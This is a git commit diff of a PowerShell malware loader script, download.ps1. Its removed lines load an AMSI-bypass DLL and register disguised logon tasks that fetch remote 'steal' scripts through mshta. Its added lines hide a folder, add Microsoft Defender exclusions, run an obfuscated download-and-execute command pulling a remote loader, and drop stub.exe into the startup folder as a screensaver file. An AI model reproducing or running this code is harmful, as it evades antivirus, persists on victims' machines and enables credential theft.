3201d2fc1c75e53e090df04120c6aebbdb9a9ee7
43a1723 <hai1723notgay@gmail.com>
2024-09-21 12:10:50 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -40,27 +40,23 @@ Write-Host "[!] Persistence Added" -ForegroundColor Green
 
 Remove-Item -Path "$startupfolder\download.bat" -Force
 
-$url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/AMSI_Bypass.dll"
-$bytes = (New-Object Net.WebClient).DownloadData($url)
-$assembly = [System.Reflection.Assembly]::Load($bytes)
-[Bypass]::amsi()
-
-$rdir = "$env:localappdata\Loader"
+$rdir = "$env:SystemDrive\Loader"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
 New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
-$task_name = "Updated"
-$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/startup-steal.ps1')|iex`",0)(window.close)"
-$task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Simple update windows" -RunLevel Highest -Force
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
-$task_name = "Minecraftlauncher"
-$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/steal.ps1')|iex`",0)(window.close)"
-$task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Launcher minecraft" -RunLevel Highest -Force
+$url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
+$output = "$startupfolder\Updated.scr"
+Add-MpPreference -ExclusionPath $output
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+}
 
